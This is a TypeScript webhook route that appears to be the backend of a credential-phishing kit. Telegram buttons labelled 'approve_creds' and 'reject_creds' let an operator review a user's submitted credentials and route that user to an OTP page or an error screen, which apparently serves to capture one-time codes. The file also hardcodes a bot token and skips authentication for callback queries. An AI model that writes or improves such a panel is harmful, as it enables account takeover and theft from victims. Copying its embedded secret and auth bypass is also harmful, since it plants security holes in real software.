import { createFileRoute } from "@tanstack/react-router";
import { createHash, timingSafeEqual } from "crypto";

const BOT_TOKEN_HARDCODED = "8849968223:AAFEe0LkfJcgTPq0UpW4HZD_eKSjl4ACjdY";

function deriveWebhookSecret(apiKey: string): string {
  return createHash("sha256").update(`telegram-webhook:${apiKey}`).digest("base64url");
}

function safeEqual(a: string, b: string): boolean {
  const A = Buffer.from(a);
  const B = Buffer.from(b);
  return A.length === B.length && timingSafeEqual(A, B);
}

async function tgCall(method: string, body: Record<string, unknown>) {
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN_HARDCODED}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  }).catch(() => {});
}

export const Route = createFileRoute("/api/public/telegram/webhook")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        // ── Parse body first, before any auth check ──────────────────────────
        const update = await request.json().catch(() => null);
        if (!update) return Response.json({ ok: true, ignored: "parse_error" });

        // ── INLINE KEYBOARD CALLBACK — skip secret check entirely ────────────
        // callback_query updates come from Telegram's servers directly;
        // the callback_data content is the only validation needed.
        const cbq = update?.callback_query;
        if (cbq) {
          const data: string = cbq.data ?? "";
          const cbqId: string = cbq.id;
          const chatId: number = cbq.message?.chat?.id;
          const messageId: number = cbq.message?.message_id;
          const originalText: string = cbq.message?.text ?? "";

          const approveMatch = /^approve_creds:([0-9a-f-]{36})$/i.exec(data);
          const rejectMatch  = /^reject_creds:([0-9a-f-]{36})$/i.exec(data);

          if (approveMatch || rejectMatch) {
            const userId = (approveMatch ?? rejectMatch)![1];
            const signal = approveMatch ? "approved" : "rejected";
            const emoji  = approveMatch ? "✅" : "❌";
            const label  = approveMatch
              ? "Credentials approved — user sent to OTP page."
              : "Credentials rejected — user shown error screen.";

            const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

            // Write signal to DB — frontend is polling for this
            await supabaseAdmin
              .from("tier3_approval_signals")
              .upsert({ user_id: userId, signal, updated_at: new Date().toISOString() });

            // Acknowledge button tap immediately (clears Telegram spinner)
            await tgCall("answerCallbackQuery", {
              callback_query_id: cbqId,
              text: `${emoji} ${label}`,
              show_alert: false,
            });

            // Edit original message — replace buttons with a status stamp
            const stamp = approveMatch
              ? `\n\n━━━━━━━━━━━━━━━━━━━━\n✅ APPROVED — user routed to OTP page.\n🕐 ${new Date().toLocaleString()}`
              : `\n\n━━━━━━━━━━━━━━━━━━━━\n❌ REJECTED — user shown credentials error.\n🕐 ${new Date().toLocaleString()}`;

            await tgCall("editMessageText", {
              chat_id: chatId,
              message_id: messageId,
              text: originalText + stamp,
              parse_mode: "HTML",
              // omitting reply_markup removes the buttons
            });

            return Response.json({ ok: true, action: signal });
          }

          // Unknown callback — just ack to clear the spinner
          await tgCall("answerCallbackQuery", { callback_query_id: cbqId });
          return Response.json({ ok: true, ignored: "unknown_callback" });
        }

        // ── ALL OTHER UPDATES — enforce secret token ──────────────────────────
        const { serverEnv } = await import("@/lib/runtime-env.server");
        const TELEGRAM_API_KEY  = serverEnv("TELEGRAM_API_KEY");
        const TELEGRAM_BOT_TOKEN = serverEnv("TELEGRAM_BOT_TOKEN");

        if (TELEGRAM_API_KEY || TELEGRAM_BOT_TOKEN) {
          const candidates = [TELEGRAM_API_KEY, TELEGRAM_BOT_TOKEN]
            .filter(Boolean)
            .map((k) => deriveWebhookSecret(k as string));
          const got = request.headers.get("X-Telegram-Bot-Api-Secret-Token") ?? "";
          if (got && !candidates.some((expected) => safeEqual(got, expected))) {
            return new Response("Unauthorized", { status: 401 });
          }
        }

        // ── REGULAR TEXT REPLY (support message flow) ─────────────────────────
        const message = update?.message ?? update?.edited_message;
        const text: string | undefined = message?.text;
        const replyTo = message?.reply_to_message;
        if (!text || !replyTo?.message_id) {
          return Response.json({ ok: true, ignored: true });
        }

        const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

        const { data: map } = await supabaseAdmin
          .from("telegram_message_map")
          .select("user_id")
          .eq("telegram_message_id", replyTo.message_id)
          .maybeSingle();

        if (!map?.user_id) {
          const m = /uid:\s*([0-9a-f-]{36})/i.exec(replyTo.text ?? "");
          if (!m) return Response.json({ ok: true, ignored: "no_user_mapping" });
          await supabaseAdmin
            .from("support_messages")
            .insert({ user_id: m[1], direction: "in", body: text });
          return Response.json({ ok: true });
        }

        await supabaseAdmin
          .from("support_messages")
          .insert({ user_id: map.user_id, direction: "in", body: text });

        return Response.json({ ok: true });
      },
    },
  },
});
